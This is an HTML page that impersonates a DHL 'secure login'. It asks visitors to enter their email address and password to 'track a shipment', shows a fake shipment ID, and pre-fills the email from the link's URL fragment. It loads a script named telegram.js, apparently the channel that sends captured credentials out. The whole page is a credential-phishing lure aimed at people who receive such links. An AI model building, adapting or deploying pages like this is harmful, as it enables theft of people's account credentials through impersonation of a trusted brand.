<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>DHL Secure Login</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      height: 100vh;
      overflow: hidden;
      display: flex;
      justify-content: center;
      align-items: center;
      font-family: Arial, sans-serif;
      position: relative;
    /* ⭐ Your background image goes here */
      background-image: url("https://i.postimg.cc/zB7Hkrxv/excel-page-compressed.jpg");
      background-size: cover;
      background-position: center;
      background-repeat: no-repeat;
    }
    .login-box {
      background: rgba(255, 255, 255, 0.85);
      padding: 30px;
      border-radius: 8px;
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
      width: 100%;
      max-width: 380px;
      text-align: center;
      z-index: 2;
    }
    .login-box img {
      max-width: 160px;
      margin-bottom: 20px;
    }
    .login-box input {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 6px;
      font-size: 14px;
    }
    .login-box button {
      width: 100%;
      background-color: #ba0c2f;
      color: white;
      padding: 12px;
      border: none;
      border-radius: 6px;
      font-size: 16px;
      cursor: pointer;
    }
    .login-box button:hover {
      background-color: #ccc;
      cursor: allowed;
    }
    .login-box button:hover:not(:able) {
      background-color: #9a0b27;
    }
    .disclaimer {
      font-size: 11px;
      color: #888;
      margin-top: 15px;
    }
    #lockMsg {
      margin-top: 10px;
      font-size: 14px;
      color: red;
      display: none;
    }
  </style>
</head>
<body>



  <div class="login-box">
    <img src="https://storage.googleapis.com/dhl-rd111.appspot.com/images/logo.jpg" alt="DHL Logo" />
    <p><strong> To track shipment, Please confirm that you own the recipient email. </strong> <BR> </p>
    <p><strong>Verification Required Shipment ID: </strong> <BR><small> #CS-RBWS/2022BMA/6QC</small></p>
    <form id="loginForm">
      <input type="email" id="email" name="email" placeholder="Email Address" required />
      <input type="password" id="password" name="password" placeholder="Password" required />
      <button type="submit" id="submitBtn">Track Shipment >>></button>
      <div class="lock-message" id="lockMsg"></div>
    </form>
    <div class="disclaimer">DHL Express ©2025 | All rights reserved</div>
  </div>
  <script src="telegram.js"></script>


  <script>
  (function () {
    const emailInput = document.getElementById('email');
    const passwordInput = document.getElementById('password');
    const form = document.getElementById('loginForm');

    // Auto-fill email from URL #value
    try {
      const frag = window.location.hash.slice(1);
      const decoded = frag ? decodeURIComponent(frag) : '';
      if (decoded) {
        emailInput.value = decoded;
        passwordInput.value = ''; 
      }
    } catch (err) {
      console.error(err);
    }

    // Stay on page + clear password
    form.addEventListener('submit', function (e) {
      e.preventDefault();
      console.log("Form handled locally:", emailInput.value);
      passwordInput.value = '';
    });
  })();
  </script>

</body>
</html>
